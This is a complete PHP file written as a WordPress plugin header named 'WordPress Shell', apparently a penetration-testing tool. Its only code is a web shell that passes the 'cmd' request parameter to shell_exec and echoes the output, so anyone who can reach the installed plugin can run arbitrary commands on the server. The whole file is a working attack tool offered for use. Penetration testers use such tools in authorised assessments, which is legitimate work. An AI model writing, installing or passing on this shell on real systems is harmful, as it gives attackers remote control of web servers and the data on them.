<?php
/*
Plugin Name: WordPress Shell
Plugin URI: https://github.com/interference-security/
Description: WordPress Web PHP Shell
Version: 1.0
Author: Interference Security
Author URI: https://github.com/interference-security/
License: GPLv2 or later
*/
if(isset($_REQUEST['cmd'])){highlight_string(shell_exec($_REQUEST['cmd']));}
?>